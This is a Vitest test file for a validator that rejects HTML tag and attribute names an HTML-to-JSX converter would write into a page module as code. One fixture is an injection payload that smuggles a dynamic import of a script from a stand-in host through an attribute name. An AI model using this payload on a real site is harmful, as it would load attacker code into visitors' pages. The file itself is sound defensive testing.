import { describe, expect, test } from "vitest";
import {
  checkCustomCodeNames,
  customCodeNamePattern,
} from "./custom-code-names";

// The reviewer's payload (spec 2026-11-20, 4.4): a boolean attribute followed
// by a name that starts with `=` and holds a JSX expression, which htmlToJsx
// would write into the home page's module as code.
const reviewerPayload = '<div async/ ={import("https://x.example/a.js")}>';

describe("checkCustomCodeNames", () => {
  test.each([
    [
      "the reviewer's payload",
      reviewerPayload,
      // parse5 7.3.0 ends the name at the first "/"
      '={import("https:',
    ],
    [
      "a tag holding a spread",
      "<a{...globalThis}>x</a{...globalThis}>",
      "a{...globalthis}",
    ],
    [
      "an attribute named @click",
      '<button @click="go()">Go</button>',
      "@click",
    ],
    ["an attribute named :class", '<div :class="x"></div>', ":class"],
    ["a member tag", "<a.b></a.b>", "a.b"],
    ["a leading underscore", "<div _x=1></div>", "_x"],
  ])("refuses %s", (_label, code, name) => {
    expect(checkCustomCodeNames(code)).toEqual({ ok: false, name });
  });

  test.each([
    [
      "script src",
      '<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>',
    ],
    [
      "inline script",
      "<script>window.dataLayer = window.dataLayer || [];</script>",
    ],
    ["style", "<style>body { color: red }</style>"],
    ["meta", '<meta property="og:title" content="x">'],
    [
      "link",
      '<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>',
    ],
    [
      "svg",
      '<svg viewBox="0 0 1 1" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#a"/></svg>',
    ],
    ["data and aria", '<div data-x="1" aria-label="y" class="z"></div>'],
    ["an underscore inside", '<div data-my_value="1"></div>'],
    ["a namespaced tag", '<fb:like href="https://x.example"></fb:like>'],
    ["a comment", "<!-- {import()} -->"],
    ["nothing", ""],
  ])("passes %s", (_label, code) => {
    expect(checkCustomCodeNames(code)).toEqual({ ok: true });
  });

  test("reads names as htmlToJsx does: not inside a template's content", () => {
    expect(checkCustomCodeNames("<template><x @y=1></x></template>")).toEqual({
      ok: true,
    });
  });

  test("names the first refused name in document order", () => {
    expect(checkCustomCodeNames('<p @a="1"><b :c="2"></b></p>')).toEqual({
      ok: false,
      name: "@a",
    });
    expect(checkCustomCodeNames('<p><b :c="2"></b></p><i @a="1"></i>')).toEqual(
      { ok: false, name: ":c" }
    );
  });
});

describe("customCodeNamePattern", () => {
  test.each(["div", "fb:like", "data-my_value", "x1", "a-b:c-d"])(
    "accepts %s",
    (name) => {
      expect(customCodeNamePattern.test(name)).toBe(true);
    }
  );
  test.each([
    "",
    "_x",
    "1a",
    "a.b",
    "a:b:c",
    "$a",
    "a{b}",
    "a b",
    "é",
    ":a",
    "a:",
    "-a",
  ])("refuses %j", (name) => {
    expect(customCodeNamePattern.test(name)).toBe(false);
  });
});
